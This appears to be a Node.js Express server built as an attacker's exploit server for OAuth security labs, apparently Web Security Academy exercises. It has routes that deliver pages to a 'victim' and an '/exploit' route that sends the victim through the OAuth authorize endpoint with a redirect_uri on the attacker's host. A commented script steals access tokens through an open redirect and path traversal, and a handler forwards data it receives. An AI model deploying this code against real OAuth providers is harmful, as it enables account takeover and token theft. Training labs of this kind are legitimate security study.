const express = require('express');
const app = express();
const port = 8083;


// Middleware
app.use((req, res, next) => {
    // Log incoming request
    console.log(`Incoming ${req.method} request to ${req.path} with query: ${JSON.stringify(req.query)} and/or parameters: ${JSON.stringify(req.params)}`);

    // Override res.send method to log outgoing response
    const oldSend = res.send;
    res.send = function(data) {
        console.log(`Outgoing response for ${req.method} request to ${req.path}: ${data}`);
        oldSend.apply(res, arguments); // Call original res.send method
    };

    // Override res.redirect method to log redirected URL
    const oldRedirect = res.redirect;
    res.redirect = function(url) {
        console.log(`Redirecting from ${req.path} to ${url}`);
        oldRedirect.apply(res, arguments); // Call original res.redirect method
    };

    next(); // Call next middleware
});


app.use(express.static('public'));
// Intent: Complete the OAuth flow using your social media profile,
// attaching it to the admin account on the blog website.
app.get('/deliver-to-victim', (req, res) => {
    res.sendFile(__dirname + '/public/oauth-linking.html');
});

app.get('/deliver-to-victim2', (req, res) => {
    res.sendFile(__dirname + '/public/oauth-commentForm.html');
});

app.get('/exploit', (req, res) => {
    if (!req.query.hash) {
        // <iframe src="https://oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>
        res.redirect('http://auth-server:9000/oauth2/authorize?response_type=code&client_id=client-code&redirect_uri=http%3A%2F%2Fhack.auth-server:8083%2Fauth&scope=users%3Aread+users%3Awrite');
        // res.redirect('http://auth-server:9000/oauth2/authorize?response_type=code&client_id=client-code&redirect_uri=http%3A%2F%2Fhack.auth-server%2Fauth&code_challenge=PBylvuRVw2U6dtwDu3tzdNSb5cXAUDOHiS0pysw1ilc&code_challenge_method=S256&scope=users%3Aread+users%3Awrite&continue');
    } else {
        res.redirect('/#' + req.query.hash);
    }
});

app.post('/message', (req, res) => {
    const data = req.body;
    console.log('Received message:', data);
    // Aqui você pode implementar a lógica para manipular os dados recebidos, como enviar uma requisição fetch
    // No exemplo abaixo, apenas enviaremos uma resposta 200 OK
    fetch("/" + encodeURIComponent(data.data))
    res.sendStatus(200);
});

app.listen(port, () => {
  console.log(`Server is listening at http://localhost:${port}`);
});


{/* <script>
    if (!document.location.hash) {
        window.location = 'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email'
    } else {
        window.location = '/?'+document.location.hash.substr(1)
    }
</script> */}